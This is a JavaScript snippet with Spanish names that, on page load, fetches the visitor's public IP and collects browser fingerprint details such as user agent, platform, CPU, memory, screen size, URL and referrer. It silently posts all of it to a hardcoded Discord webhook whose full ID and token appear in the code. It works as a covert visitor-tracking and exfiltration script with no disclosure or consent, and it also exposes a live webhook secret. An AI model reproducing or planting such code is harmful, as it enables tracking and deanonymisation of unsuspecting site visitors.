async function obtenerIP() {
  try {
    const respuesta = await fetch('https://api.ipify.org?format=json');
    const datos = await respuesta.json();
    return datos.ip;
  } catch {
    return 'IP no disponible';
  }
}

function obtenerInfoAvanzada() {
  try {
    return {
      userAgent: navigator.userAgent,
      idioma: navigator.language,
      plataforma: navigator.platform,
      cookies: navigator.cookieEnabled,
      cpu: navigator.hardwareConcurrency,
      memoria: navigator.deviceMemory,
      touch: navigator.maxTouchPoints,
      pantalla: `${screen.width}x${screen.height} (${screen.colorDepth} bits)`,
      url: window.location.href,
      referrer: document.referrer
    };
  } catch {
    return {};
  }
}

async function enviarDatosDiscord() {
  const ip = await obtenerIP();
  const info = obtenerInfoAvanzada();

  const embed = {
    title: "📥 Nuevo visitante",
    color: 0x3498db, // Color azul
    timestamp: new Date().toISOString(),
    fields: [
      { name: "📡 IP", value: ip, inline: false },
      { name: "🌐 URL", value: info.url || "No disponible", inline: false },
      { name: "🔁 Referrer", value: info.referrer || "No disponible", inline: false },
      { name: "🧠 User-Agent", value: info.userAgent || "No disponible", inline: false },
      { name: "🗣️ Idioma", value: info.idioma || "No disponible", inline: true },
      { name: "💻 Plataforma", value: info.plataforma || "No disponible", inline: true },
      { name: "🍪 Cookies habilitadas", value: String(info.cookies), inline: true },
      { name: "🧮 Núcleos CPU", value: String(info.cpu), inline: true },
      { name: "📈 Memoria (GB)", value: String(info.memoria), inline: true },
      { name: "📱 Touch Points", value: String(info.touch), inline: true },
      { name: "🖥️ Pantalla", value: info.pantalla || "No disponible", inline: false }
    ],
    footer: {
      text: "Información del visitante"
    }
  };

  fetch('https://discord.com/api/webhooks/1393779023548776591/tLNcOb11GsA956uIzaLifR7FUSvRlfYlnYDq2aiSdU0Ecwvl6gE7flf79MKQ123CnJVY', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ embeds: [embed] })
  });
}

window.addEventListener('load', enviarDatosDiscord);
